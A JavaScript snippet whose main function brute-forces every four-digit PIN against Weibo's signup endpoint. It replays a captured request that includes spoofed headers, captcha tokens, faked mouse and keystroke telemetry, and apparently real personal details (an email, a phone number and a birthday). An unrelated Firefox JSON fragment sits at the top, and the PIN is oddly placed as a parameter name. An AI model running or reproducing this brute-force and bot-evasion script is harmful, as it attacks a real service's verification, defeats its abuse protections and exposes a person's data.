//

let text = `{
  "browsers": {
    "firefox": {
      "name": "Firefox",
      "pref_url": "about:config",
      "releases": {
        "1": {
          "release_date": "2004-11-09",
          "status": "retired",
          "engine": "Gecko",
          "engine_version": "1.7"
        }
      }
    }
  }
}`;

jobj = JSON.parse(text);

jobj = jobj["browsers"];

function tryAllPincode() {
	for (let i = 0; i < 10000; ++i) {
		let pincode = i.toString().padStart(4, '0');

		let text = `{
	"headers": {
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
		"cache-control": "max-age=0",
		"content-type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "Google Chrome;v=105, Not)A;Brand;v=8, Chromium;v=105",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "macOS",
		"sec-fetch-dest": "iframe",
		"sec-fetch-mode": "navigate",
		"sec-fetch-site": "same-origin",
		"sec-fetch-user": "?1",
		"upgrade-insecure-requests": "1"
	},
	"referrer": "https://weibo.com/signup/signup.php",
	"referrerPolicy": "strict-origin-when-cross-origin",
	"body": "username=jumhorn%40gmail.com&passwd=2872c56a91deacac17ddeb9af1d4150decb753b9cb4de928a05d4dc3cd0bcc4d0b0e011dae8b74cb49318495b1c2ebffb1b5a0f28c83f1aea87e8ff51a17ef01f0ee0dc64210ad087faac927aebb5ce7439a647d65a364204fef2634e52d72c9a69782c401fc2b79990e597b9be660ff8a093e01f403e2dbe875aff2644ddcb0&birthday=1993-2-15&0d304292ccd2e9e673f0cdb5e86a887f=dd8cb9d989a04bda8cc97c8a0125d4d4&dc3c44b4bb7aa37c320545af22c47f26=86ea14ef224875c1294bee6654b99c45&baea24a118560ee957d2cb9c5a7a4a8d=ec1b7d23570c3945791118d9687658f0&8fb83bafa88141c81a718cc95bc7bbfb=727b44a7a5e9d93fc85ffa1b44703ee4&c4ed474e96ed4c2d8898098a5e7f49f1=1708eed8807fc7b06a4ee708d71c2933&3f06a76cdaafe5821b95b7cbdbacfccc=8121b0f0905ee9b71deb618aad8b1d71&7a00ad5f8bf6d921d8858709a1f34b95=4cd7be563969cad9d31f20ad5f81b3e2&dd8cb9d989a04bda8cc97c8a0125d4d4=af975fc43ec95f7fd04dde40593c0738&86ea14ef224875c1294bee6654b99c45=689302651f39d79122499f96a04c38d8&ec1b7d23570c3945791118d9687658f0=360bc995340f338213bcc863e360f3ae&727b44a7a5e9d93fc85ffa1b44703ee4=395316235f1c01ceaaa50f3ced88469e&1708eed8807fc7b06a4ee708d71c2933=a0778939924bf295b8f9fe1f429da9e1&inviteCode=&from=&callback=STK_166407116168513&mcode=&mbk=&regtime=1664071134&salttime=a7b732983afa547fc12a0ce54a54e818&sinaid=0fd72d2fc59993db76e190bc849d7559&page=email&invitesource=0&lang=en-us&backurl=&appsrc=&showlogo=&c=&${pincode}=1234&rejectFake=clickCount%253D7%2526subBtnClick%253D0%2526keyPress%253D30%2526menuClick%253D0%2526mouseMove%253D205%2526checkcode%253D0%2526subBtnPosx%253D428%2526subBtnPosy%253D528%2526subBtnDelay%253D3%2526keycode%253D106%252C117%252C109%252C104%252C111%252C114%252C110%252C46%252C64%252C103%252C109%252C97%252C105%252C108%252C46%252C99%252C111%252C109%252C74%252C117%252C109%252C95%252C49%252C48%252C50%252C51%252C122%252C122%252C114%252C120%2526winWidth%253D1285%2526winHeight%253D731%2526userAgent%253DMozilla%252F5.0%2520%28Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F105.0.0.0%2520Safari%252F537.36&entry=&replaceurl=%2F%2Fweibo.com%2Fsignup%2Fv5%2Fajaxreg&mobile=8125103051&tactics=checkPinMessage&closeSendsms=&zone=001&validateExtra=1&captcha_id=88047881b669fd8cf6de1999f79a2e8d&lot_number=84abfa1628f741a4a31e6df0dfa3aec5&pass_token=b3a02e9c41d6e9a82cf1776432e35c852f74587b72ab7bed70cf8e6536725df0&gen_time=1664099198&captcha_output=Wk6yztn9BNIgk4uiRhGs4R0_ie0Obgxv3nMfSWnOiisONeu3iosxYc-4uXMNtnZf2YkgoqOVvSTXFzlwaoo9GRDwsa5G-5dKx7XNPQPK4LHDVkdPlrUDdC8mHgm6Unbob3Yt0uJY3xZKqf7TYVW25Szh-TSveenaFoMvRwFHHvK3JFdC_KRHZhFF3V3YlcyKYtFP6s_HV1Io_srY8bkK3mXwzOmD1uA2ppGmew77L4x6qhZfOt5pNzOqszioErXILfjJDohJmc8FcnyDycSmRA%3D%3D&type=sendsms&value=8125103051",
	"method": "POST",
	"mode": "cors",
	"credentials": "include"
}`;

		fetch("https://weibo.com/signup/v5/reg", JSON.parse(text));
	}
};